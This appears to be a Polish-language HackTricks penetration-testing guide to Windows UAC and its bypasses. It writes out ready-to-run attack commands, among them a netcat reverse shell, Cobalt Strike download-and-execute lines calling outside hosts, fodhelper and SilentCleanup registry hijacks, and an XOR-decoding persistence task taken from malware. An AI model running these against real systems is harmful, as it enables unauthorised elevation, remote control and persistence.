# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogą potencjalnie narazić system na niebezpieczeństwo**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta nieadministracyjnego**, chyba że administrator jawnie zezwoli tym aplikacjom/zadaniom na dostęp do systemu na poziomie administratora. Jest to funkcja ułatwiająca obsługę, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.<sup>[[2]](#references)</sup>

Więcej informacji o poziomach integralności:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywne, użytkownik będący administratorem otrzymuje 2 tokeny: token standardowego użytkownika do wykonywania zwykłych działań przy średnim poziomie integralności oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia działanie UAC i obejmuje proces logowania, doświadczenia użytkownika oraz architekturę UAC.<sup>[[2]](#references)</sup> Administratorzy mogą używać zasad zabezpieczeń do konfigurowania sposobu działania UAC zgodnie z wymaganiami organizacji lokalnie (za pomocą secpol.msc) albo konfigurować je i wdrażać za pośrednictwem obiektów zasad grupy (GPO) w środowisku domeny Active Directory. Różne ustawienia zostały szczegółowo omówione [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można skonfigurować 10 ustawień zasad grupy. Poniższa tabela zawiera dodatkowe informacje:

| Ustawienie zasad grupy                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru                | Ustawienie domyślne                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Tryb zatwierdzania przez administratora dla wbudowanego konta Administrator](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
| [User Account Control: Zachowanie monitu o podwyższenie uprawnień dla administratorów w trybie zatwierdzania przez administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Monit o zgodę dla plików binarnych innych niż Windows na bezpiecznym pulpicie) |
| [User Account Control: Zachowanie monitu o podwyższenie uprawnień dla użytkowników standardowych](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Monit o poświadczenia na bezpiecznym pulpicie)         |
| [User Account Control: Wykrywanie instalacji aplikacji i monit o podwyższenie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Włączone; domyślnie wyłączone w wersji Enterprise)           |
| [User Account Control: Podwyższanie uprawnień wyłącznie dla podpisanych i zweryfikowanych plików wykonywalnych](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
| [User Account Control: Podwyższanie uprawnień wyłącznie dla aplikacji UIAccess zainstalowanych w bezpiecznych lokalizacjach](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
| [User Account Control: Uruchamianie wszystkich administratorów w trybie zatwierdzania przez administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
| [User Account Control: Zezwalanie aplikacjom UIAccess na wyświetlanie monitu o podwyższenie uprawnień bez używania bezpiecznego pulpitu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
| [User Account Control: Przełączanie na bezpieczny pulpit podczas wyświetlania monitu o podwyższenie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
| [User Account Control: Wirtualizowanie nieudanych zapisów plików i rejestru do lokalizacji poszczególnych użytkowników](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |

### Zasady instalowania oprogramowania w Windows

**Lokalne zasady zabezpieczeń** („secpol.msc” w większości systemów) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym administratorami instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik niebędący administratorem może pobrać instalator danego oprogramowania, nie będzie mógł go uruchomić bez konta administratora.

### Klucze rejestru wymuszające monit UAC o podwyższenie uprawnień

Jako standardowy użytkownik bez uprawnień administratora możesz upewnić się, że konto „standardowe” będzie **monitowane przez UAC o podanie poświadczeń**, gdy spróbuje wykonać określone działania. Wymagałoby to zmodyfikowania określonych **kluczy rejestru**, do czego potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** albo atakujący jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, zmiany te wymuszają **ponowne wprowadzenie danych uwierzytelniających konta**, aby wykonać działania administracyjne.

**W praktyce jest to przydatne tylko wtedy, gdy masz już podwyższony token, UAC bypass albo błędną konfigurację umożliwiającą zmianę tych kluczy; w przeciwnym razie sam zapis do rejestru zostanie zablokowany.**

Klucze i wpisy rejestru, które należy zmienić, są następujące (z ich wartościami domyślnymi w nawiasach):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Można to również zrobić ręcznie za pomocą narzędzia Local Security Policy. Po wprowadzeniu zmian operacje administracyjne wymagają od użytkownika ponownego wprowadzenia poświadczeń.

### Uwaga

**User Account Control nie jest granicą bezpieczeństwa.** Dlatego standardowi użytkownicy nie mogą wydostać się ze swoich kont i uzyskać uprawnień administratora bez wykorzystania exploita do local privilege escalation.

### Poproś użytkownika o „pełny dostęp do komputera”
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Uprawnienia UAC

- Tryb chroniony Internet Explorer używa kontroli integralności, aby uniemożliwić procesom o wysokim poziomie integralności (takim jak przeglądarki internetowe) dostęp do danych o niskim poziomie integralności (takich jak folder tymczasowych plików internetowych). Osiąga się to przez uruchomienie przeglądarki z tokenem o niskim poziomie integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskim poziomie integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać atakom zdalnego wykonania kodu, które mogłyby uzyskać dostęp do poufnych danych w systemie.
- Gdy użytkownik loguje się do systemu Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę poświadczeń użytkownika, czyli poświadczeń używanych do uwierzytelniania użytkownika na komputerze i w zasobach sieciowych.

### Autoadminlogon

Aby skonfigurować system Windows tak, aby automatycznie logował określonego użytkownika podczas uruchamiania, ustaw **klucz rejestru `AutoAdminLogon`**. Jest to przydatne w środowiskach kiosków lub do celów testowych. Używaj tej funkcji tylko w bezpiecznych systemach, ponieważ hasło będzie widoczne w rejestrze.

Ustaw następujące klucze za pomocą Edytora rejestru lub `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.

## Obejście UAC

> [!TIP]
> Pamiętaj, że jeśli masz dostęp graficzny do komputera ofiary, obejście UAC jest proste, ponieważ po pojawieniu się monitu UAC możesz po prostu kliknąć „Yes”

Obejście UAC jest potrzebne w następującej sytuacji: **UAC jest aktywne, Twój proces działa w kontekście o średnim poziomie integralności, a Twój użytkownik należy do grupy administratorów**.

Należy wspomnieć, że **obejście UAC jest znacznie trudniejsze, gdy poziom zabezpieczeń jest najwyższy (Always), niż gdy ustawiony jest którykolwiek z pozostałych poziomów (Default).**

### Szybki triage z powłoki o średnim poziomie integralności

Przed próbą obejścia potwierdź, że znajdujesz się w odpowiednim scenariuszu, i dopasuj build hosta do znanych działających metod:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktyczne uwagi:
- Jeśli `EnableLUA=0`, nie potrzebujesz bypassu: dowolny token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla auto-elevate / COM-based bypasses.
- `Always Notify` podnosi poprzeczkę, ale nadal należy przetestować dokładną kompilację zamiast zakładać niepowodzenie: UACME nadal śledzi niektóre metody `AlwaysNotify compatible` we współczesnych kompilacjach Windows.<sup>[[3]](#references)</sup>

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` wynosi **`0`**), możesz **uruchomić reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś takiego:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Lokalny RPC + ponownie używalny obiekt debugowania

Interfejs lokalnego RPC AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` może utworzyć proces z włączonym debugowaniem. Procesy utworzone przez debugowanie w tym samym wątku współdzielą obiekt debugowania tego wątku; zdarzenie debugowania utworzenia przekazuje uchwyt procesu z pełnym dostępem, nawet gdy sam wynik RPC zapewnia wyłącznie ograniczony dostęp. Zmienia to ponowne użycie obiektu debugowania w prymityw UAC dla członka grupy Administrators o poziomie integralności medium.<sup>[[11]](#references)[[12]](#references)</sup>

Praktyczny łańcuch wygląda następująco:<sup>[[11]](#references)[[12]](#references)</sup>

1. Wywołaj lokalną metodę RPC (bezpośrednio lub za pośrednictwem `NdrAsyncClientCall`), aby utworzyć niepodniesiony proces ofiarny z włączonym debugowaniem.
2. Odpytaj `ProcessDebugObjectHandle` za pomocą `NtQueryInformationProcess`, odłącz go za pomocą `NtRemoveProcessDebug`, zachowaj obiekt i zakończ proces ofiarny.
3. Użyj tego samego interfejsu RPC, aby utworzyć zaufany proces auto-elevated, a następnie powiąż zapisany obiekt z wywołującym wątkiem za pomocą `DbgUiSetThreadDebugObject`.
4. Wywołaj `WaitForDebugEvent` i pobierz uchwyt procesu z `CREATE_PROCESS_DEBUG_EVENT`; zduplikuj go za pomocą `NtDuplicateObject` przed kontynuowaniem.
5. Przekaż zduplikowany uchwyt do `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` i uruchom payload z rozszerzoną strukturą informacji startowych. W ten sposób ponownie wykorzystasz kontekst podniesionego procesu i nadasz procesowi potomnemu relację zaufanego rodzica.

Wyszukuj krótką sekwencję, a nie tylko plik binarny auto-elevated: utworzenie procesu przez lokalny RPC AppInfo, zapytania `ProcessDebugObjectHandle`, odłączanie/ponowne podłączanie debuggera, natychmiastowe zdarzenie debugowania utworzenia, duplikowanie uchwytu oraz proces potomny, którego zarejestrowany rodzic nie odpowiada procesowi, który wykonał API tworzenia.<sup>[[12]](#references)</sup>

### **Bardzo** podstawowy UAC "bypass" (pełny dostęp do systemu plików)

Jeśli masz shell użytkownika należącego do grupy Administrators, możesz **zamontować udział C$** przez SMB (system plików) lokalnie jako nowy dysk i uzyskasz **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Techniki Cobalt Strike zadziałają tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom bezpieczeństwa
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** również mają kilka modułów do **bypass** **UAC**.

### Podwyższone interfejsy COM (`ICMLuaUtil` / `CMSTPLUA`)

Automatycznie podnoszone uprawnienia obiektów COM pozostają praktycznym wektorem UAC w nowoczesnych kompilacjach. `ICMLuaUtil` jest nadal oznaczany przez UACME jako działający w obecnych gałęziach Windows, a narzędzia offensive nadal dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, wykonywanie 64-bitowe i czasami podszywanie się pod PEB/proces przed wywołaniem COM Elevation Moniker.<sup>[[3]](#references)</sup>

Praktyczne wskazówki:
- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
- Jeśli surowa powłoka zawiedzie, ponów próbę z implementacji BOF / UACME zamiast naiwnego wrappera `CreateProcess`.
- Zakładaj, że wykonywanie procesu potomnego nastąpi w **oddzielnym procesie z podwyższonymi uprawnieniami**; wiele BOF nie podnosi uprawnień bieżącego beacona w miejscu.

### KRBUACBypass

Dokumentacja i narzędzie dostępne pod adresem [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploity omijające UAC

[**UACME**](https://github.com/hfiref0x/UACME) to zbiór technik bypass UAC. Skompiluj je za pomocą Visual Studio lub MSBuild; kompilacja tworzy kilka plików wykonywalnych (na przykład `Source\Akagi\output\x64\Debug\Akagi.exe`), więc wybierz metodę odpowiednią dla docelowej kompilacji.<sup>[[3]](#references)</sup>\
Zachowaj ostrożność: niektóre bypass uruchamiają widoczne programy lub monity, które mogą zaalarmować użytkownika.<sup>[[3]](#references)</sup>

UACME zawiera **wersję kompilacji, od której każda technika zaczęła działać**.<sup>[[3]](#references)</sup> Możesz wyszukać technikę wpływającą na używane przez Ciebie wersje:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ponadto, korzystając ze [strony](https://en.wikipedia.org/wiki/Windows_10_version_history), można uzyskać wydanie Windows `1607` na podstawie wersji builda.

Praktyczny workflow polega na tym, aby najpierw **ocenić build hosta**, a dopiero potem uruchomić pasującą metodę:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` szybko porównuje lokalny build ze znanymi metodami UAC, co pomaga szybko odrzucić nieaktualne PoC.<sup>[[4]](#references)</sup>
- `UACME` pozostaje najlepszym publicznym katalogiem do powiązania bypassu z konkretnym buildem. Wersja 3.7.1 dodała metody 83–85, natomiast poprzednie wydanie ponownie przetestowało istniejące metody na **Windows 11 25H2**; sprawdź ponownie tabelę metod i informacje o wydaniu, zamiast zakładać, że stary PoC nadal działa bez zmian.<sup>[[3]](#references)[[9]](#references)</sup>

### Łańcuchy WNF/UIAccess obsługujące Always Notify (UACME 3.7.1)

`Always Notify` nie eliminuje każdego bypassu UAC. UACME 3.7.1 implementuje trzy nowe metody x64, które łączą kontrolowany przez użytkownika stan środowiska/protokołu z działaniem podwyższonego zadania zaplanowanego lub UIAccess, i oznacza wszystkie jako `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** przekieruj `SystemRoot`, aby wywołane przez WNF zadanie `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` spowodowało, że podwyższony `taskhostw.exe` załaduje side-loadowany `unifiedconsent.dll`. UACME śledzi tę metodę od Windows 10 build 19041.
- **84 — TabTip:** użyj tego samego prymitywu zmiennej środowiskowej wobec UIAccess `TabTip.exe`, który w zależności od builda ładuje `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` lub `rsaenh.dll`, a następnie przejdź z uzyskanego kontekstu UIAccess o wysokiej integralności. UACME śledzi tę metodę od Windows 8.1 / Server 2016.
- **85 — Narrator:** przejmij per-user protokół `feedback-hub`, steruj Narratorem za pomocą `Alt+CapsLock+F`, a następnie uruchom zapisywalną kopię `osk.exe`, która ładuje side-loadowany `OskSupport.dll`. Wymaga to interaktywnego pulpitu i jest śledzone od Windows 10 1809 / Server 2019.

Po zbudowaniu jednostek payloadu i Akagi zgodnie z dokumentacją UACME wywołaj pasujący numer metody (opcjonalne polecenie domyślnie to `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Metody 84 i 85 zależą od UIAccess/interakcji z pulpitem, więc nie należy oczekiwać, że zadziałają bez zmian z Session 0 lub z nieinteraktywnej powłoki usługi. Wszystkie trzy manipulują stanem środowiska/protokołu i przygotowują biblioteki DLL; po zakończeniu testów sprawdź implementację i usuń te artefakty.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany plik binarny `fodhelper.exe` jest automatycznie podnoszony do wyższych uprawnień we współczesnym systemie Windows. Po uruchomieniu odczytuje poniższą ścieżkę rejestru użytkownika bez weryfikowania czasownika `DelegateExecute`. Umieszczenie tam polecenia umożliwia procesowi o poziomie Medium Integrity (użytkownik należy do grupy Administrators) uruchomienie procesu o poziomie High Integrity bez monitu UAC.

Ścieżka rejestru odczytywana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Kroki PowerShell (ustaw swój payload, a następnie go uruchom)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Uwagi:
- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators, a poziom UAC jest domyślny/łagodny (nie Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do pliku EXE). Aby zachować skrytość, unikaj interfejsów UIs wyświetlających monity.

#### Wariant CurVer/extension hijack (tylko HKCU)

Nowsze próbki wykorzystujące `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości `CurVer` dla bieżącego użytkownika. Auto-elevated binary nadal rozwiązuje handler w `HKCU`, więc do utworzenia kluczy nie jest wymagany token administratora:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Po uzyskaniu podwyższonych uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania typu defense evasion (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby uruchamiać się z high integrity. Typowe zadanie persistence przechowuje na dysku **zaszyfrowany algorytmem XOR skrypt PowerShell**, a następnie co godzinę dekoduje go i wykonuje in-memory:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ten wariant nadal usuwa dropper i pozostawia tylko staged payloads, przez co wykrywanie opiera się na monitorowaniu **hijack `CurVer`**, manipulacji `ConsentPromptBehaviorAdmin`, tworzeniu exclusions w Defenderze lub scheduled tasks, które odszyfrowują PowerShell w pamięci.<sup>[[5]](#references)</sup>

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie do dowolnego polecenia i uzyskać high integrity bez wyświetlania monitu zgody.<sup>[[8]](#references)</sup> Ta metoda nadal zasługuje na testowanie w najnowszych wersjach, ponieważ UACME utrzymuje tę technikę jako aktywną, a śledzenie najnowszych zgłoszeń wskazuje, że Windows 11 24H2 może wymagać jedynie niewielkich korekt w quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Jeśli zadanie cytuje ścieżkę w tej kompilacji, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Po zakończeniu testów zawsze wyczyść `HKCU\Environment\windir`.

#### Więcej UAC bypass

Wiele klasycznych UAC bypass, które wykorzystują przepływy interfejsu użytkownika, obiekty COM lub interakcję z pulpitem, wymaga **pełnej interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub usługa działająca w **Session 0** często nie wystarczy.

Często można to rozwiązać za pomocą sesji **meterpreter**. Przenieś się do **procesu**, który ma wartość **Session** równą **1**:

![Skieruj ms-settings na niestandardowe rozszerzenie (.thm) i przypisz to rozszerzenie do naszego payloadu - Więcej UAC bypass: Możesz to uzyskać za pomocą sesji meterpreter. Przenieś się do procesu, który ma wartość Session...](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### UAC Bypass z GUI

Jeśli masz dostęp do **GUI**, możesz po prostu zaakceptować monit UAC, gdy się pojawi; tak naprawdę nie potrzebujesz technicznego bypassu. Dlatego uzyskanie sesji GUI często wystarcza, aby ominąć praktyczne utrudnienia dodane przez UAC.

Co więcej, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie za pośrednictwem RDP), **niektóre narzędzia będą uruchomione jako administrator**, dzięki czemu możesz **uruchomić** na przykład **cmd** bezpośrednio **jako administrator**, bez ponownego wyświetlania monitu UAC, używając narzędzia takiego jak [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.

### Głośny brute-force UAC bypass

Jeśli hałas jest akceptowalny, narzędzie takie jak [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) może wielokrotnie żądać podniesienia uprawnień, aż użytkownik je zaakceptuje.

### Własny bypass - podstawowa metodologia UAC bypass

Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele UAC bypass wykorzystuje DLL hijacking** (często przez wymuszenie załadowania przez podwyższony binarny plik kontrolowanej przez atakującego biblioteki DLL ze ścieżki z prawem zapisu). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź plik binarny, który wykonuje **autoelevate** (sprawdź, czy po uruchomieniu działa na poziomie wysokiej integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musiał **zapisać** bibliotekę DLL w jednej z **chronionych ścieżek** (takich jak C:\Windows\System32), do których nie masz uprawnień zapisu. Możesz to obejść za pomocą:
1. **wusa.exe**: Windows 7, 8 i 8.1. Umożliwia wyodrębnienie zawartości pliku CAB do chronionych ścieżek (ponieważ to narzędzie jest uruchamiane z poziomu wysokiej integralności).
2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, który skopiuje bibliotekę DLL do chronionej ścieżki oraz uruchomi podatny i automatycznie podwyższający uprawnienia plik binarny.

### Inna technika UAC bypass

Polega na sprawdzeniu, czy **autoElevated binary** próbuje odczytać z **rejestru** **nazwę/ścieżkę** **pliku binarnego** lub **polecenia**, które ma zostać **wykonane** (jest to ciekawsze, jeśli plik binarny wyszukuje te informacje w obrębie **HKCU**).

### UAC bypass przez `SysWOW64\iscsicpl.exe` + DLL hijack użytkownika `PATH`

32-bitowy plik `C:\Windows\SysWOW64\iscsicpl.exe` to **auto-elevated** binary, który można wykorzystać do załadowania `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli możesz umieścić złośliwy plik `iscsiexe.dll` w folderze z **prawem zapisu dla użytkownika**, a następnie zmodyfikować `PATH` bieżącego użytkownika (na przykład za pośrednictwem `HKCU\Environment\Path`), tak aby ten folder był przeszukiwany, Windows może załadować bibliotekę DLL atakującego do podwyższonego procesu `iscsicpl.exe` **bez wyświetlania monitu UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktyczne uwagi:
- Jest to przydatne, gdy bieżący użytkownik należy do grupy **Administrators**, ale z powodu UAC działa na poziomie **Medium Integrity**.
- Kopia w **SysWOW64** jest istotna dla tego bypassu. Kopię w **System32** traktuj jako oddzielny plik binarny i niezależnie zweryfikuj jej zachowanie.
